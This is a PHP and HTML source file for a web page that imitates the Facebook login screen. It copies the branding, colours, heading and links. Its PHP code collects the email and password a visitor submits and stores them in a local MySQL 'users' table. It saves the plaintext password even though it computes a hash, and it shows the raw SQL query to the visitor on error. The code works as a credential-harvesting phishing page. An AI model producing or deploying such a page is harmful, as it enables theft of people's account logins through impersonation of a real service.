<?php
// Database connection
$servername = "localhost";
$username = "root";
$password = ""; // replace with your MySQL root password
$dbname = "user_data_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Initialize variables for success message
$success = '';

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if email and password fields are set
    if (isset($_POST['email']) && isset($_POST['password'])) {
        $email = mysqli_real_escape_string($conn, $_POST['email']);
        $password = mysqli_real_escape_string($conn, $_POST['password']);

        // Hash the password for security
        $hashed_password = password_hash($password, PASSWORD_DEFAULT);

        // Insert the user's data into the database
        $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
        if ($conn->query($sql) === TRUE) {
            $success = "New record created successfully";
        } else {
            $success = "Error: " . $sql . "<br>" . $conn->error;
        }
    } else {
        $success = "Email and Password are required.";
    }
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    width:100%;
    margin: 0;
    padding: 0;
    overflow: hidden;
}

.container {
    text-align: center;
    margin: 0;
    padding: 0;
    overflow: hidden;
}

.login-box {
    background-color: #ffffff;
    padding: 20px;
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    border-radius: 8px;
    width: 360px;
}

.logo {
    font-size: 36px;
    color: #1877f2;
    margin: 0;
    font-weight: bold;
}

h2 {
    font-size: 20px;
    color: #1c1e21;
    margin: 10px 0 20px;
    font-weight: normal;
}

.input-container {
    margin-bottom: 10px;
}

input[type="text"],
input[type="password"] {
    width: calc(100% - 20px);
    padding: 10px;
    margin: 0;
    border: 1px solid #dddfe2;
    border-radius: 6px;
    box-sizing: border-box;
    font-size: 16px;
}

button {
    width: calc(100% - 20px);
    padding: 15px;
    border: none;
    border-radius: 6px;
    background-color: #1877f2;
    color: #ffffff;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background-color: #165dbb;
}

.footer-links {
    margin-top: 20px;
    font-size: 14px;
}

.footer-links a {
    color: #1877f2;
    text-decoration: none;
}

.footer-links a:hover {
    text-decoration: underline;
}

    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1 class="logo">facebook</h1>
            <h2>Log in to Facebook</h2>
            <form action="login.php" method="post">
                <div class="input-container">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                </div>
                <div class="input-container">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log in</button>
            </form>
            <div class="footer-links">
                <a href="#">Forgotten account?</a> · <a href="#">Sign up for Facebook</a>
            </div>
            <?php if ($success): ?>
                <p class="success"><?php echo $success; ?></p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
